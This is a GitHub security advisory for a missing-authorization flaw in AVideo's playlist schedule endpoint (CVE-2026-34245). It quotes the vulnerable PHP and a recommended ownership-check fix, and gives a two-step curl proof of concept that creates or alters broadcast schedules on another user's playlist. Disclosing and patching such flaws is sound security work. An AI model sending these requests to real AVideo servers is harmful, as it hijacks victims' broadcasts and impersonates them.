# [M] AVideo: Missing Authorization in Playlist Schedule Creation Allows Cross-User Broadcast Hijacking

## Summary
Severity: Medium
Advisory: GHSA-2rm7-j397-3fqg
CVE: CVE-2026-34245
CWE: CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2026-03-29
Source: https://github.com/advisories/GHSA-2rm7-j397-3fqg
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `plugin/PlayLists/View/Playlists_schedules/add.json.php` endpoint allows any authenticated user with streaming permission to create or modify broadcast schedules targeting any playlist on the platform, regardless of ownership. When the schedule executes, the rebroadcast runs under the victim playlist owner's identity, allowing content hijacking and stream disruption.

## Details

The endpoint at `plugin/PlayLists/View/Playlists_schedules/add.json.php` performs only a capability check, not an ownership check:

```php
// add.json.php:14 — only checks if user CAN stream, not if they OWN the playlist
if (!User::canStream()) {
    forbiddenPage(__("You cannot livestream"));
}

// Line 18-19: attacker-controlled playlists_id is used directly
$o = new Playlists_schedules(@$_POST['id']);
$o->setPlaylists_id($_POST['playlists_id']);
```

The `Playlists_schedules::save()` method (line 182) only validates that `playlists_id` is non-empty — no ownership check:

```php
public function save()
{
    if(empty($this->playlists_id)){
        _error_log("Playlists_schedules::save playlists_id is empty");
        return false;
    }
    // ...
    return parent::save();
}
```

When the schedule triggers via `plugin/PlayLists/run.php`, the rebroadcast executes under the **playlist owner's** user ID, not the schedule creator's:

```php
// run.php:55 — uses playlist owner's ID
$pl = new PlayList($ps->playlists_id);
$response = Rebroadcaster::rebroadcastVideo(
    $ps->current_videos_id,
    $pl->getUsers_id(),  // <-- victim's user ID
    Playlists_schedules::getPlayListScheduledIndex($value['id']),
    $title
);
```

By contrast, all other playlist modification endpoints properly verify ownership via `PlayLists::canManagePlaylist()`:

```php
// PlayLists.php:55-68
static function canManagePlaylist($playlists_id)
{
    if (!User::isLogged()) return false;
    if (self::canManageAllPlaylists()) return true;
    $pl = new PlayList($playlists_id);
    if ($pl->getUsers_id() == User::getId()) return true;
    return false;
}
```

This check is used in `saveShowOnTV.json.php:43`, `playListToSerie.php:24`, and `getPlaylistButtons.php:34`, but is entirely absent from `add.json.php`.

Additionally, the `delete.json.php` endpoint requires `User::isAdmin()` (line 11), making the disparity with `add.json.php` even clearer.

When providing an existing schedule `id` via POST (line 18), no ownership check is performed on the existing schedule record either, allowing modification of any schedule on the platform.

## PoC

```bash
# Step 1: Authenticate as a normal user with streaming permission
# Obtain PHPSESSID via login

# Step 2: Create a broadcast schedule targeting another user's playlist
# Replace VICTIM_PLAYLIST_ID with the target playlist ID (enumerable via API)
curl -X POST 'https://target.com/plugin/PlayLists/View/Playlists_schedules/add.json.php' \
  -H 'Cookie: PHPSESSID=<attacker_session>' \
  -d 'playlists_id=<VICTIM_PLAYLIST_ID>&name=hijacked&start_datetime=2026-03-26+12:00:00&finish_datetime=2026-03-27+12:00:00&loop=1&repeat=d&parameters={}'

# Expected: {"error":false} — schedule created for victim's playlist
# The schedule will execute via run.php under the victim's user identity

# Step 3: Modify an existing schedule by providing its id
curl -X POST 'https://target.com/plugin/PlayLists/View/Playlists_schedules/add.json.php' \
  -H 'Cookie: PHPSESSID=<attacker_session>' \
  -d 'id=<EXISTING_SCHEDULE_ID>&playlists_id=<VICTIM_PLAYLIST_ID>&name=modified&start_datetime=2026-03-26+00:00:00&finish_datetime=2026-03-28+00:00:00&loop=1&repeat=d&parameters={}'
```

## Impact

- **Content hijacking:** Attacker can force-broadcast content from any user's playlist, including private or paid content
- **Stream disruption:** Scheduled rebroadcast can interfere with a victim's ongoing live streams
- **Identity abuse:** Rebroadcast executes under the victim's user identity, making it appear the victim initiated the broadcast
- **Resource consumption:** Scheduled broadcasts consume the victim's server bandwidth allocation
- **Schedule tampering:** Existing schedules can be modified or redirected by any streaming user

## Recommended Fix

Add ownership validation in `add.json.php` before saving:

```php
// After line 16 (canStream check), add:
$playlists_id = intval($_POST['playlists_id']);
if (!PlayLists::canManagePlaylist($playlists_id)) {
    forbiddenPage(__("You cannot manage this playlist"));
}

// When editing existing schedules, also verify ownership of the existing record:
if (!empty($_POST['id'])) {
    $existing = new Playlists_schedules(intval($_POST['id']));
    if (!PlayLists::canManagePlaylist($existing->getPlaylists_id())) {
        forbiddenPage(__("You cannot modify this schedule"));
    }
}
```

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-2rm7-j397-3fqg
- https://nvd.nist.gov/vuln/detail/CVE-2026-34245
- https://github.com/WWBN/AVideo/commit/1e6dc20172de986f60641eb4fdb4090f079ffdce
- https://github.com/WWBN/AVideo
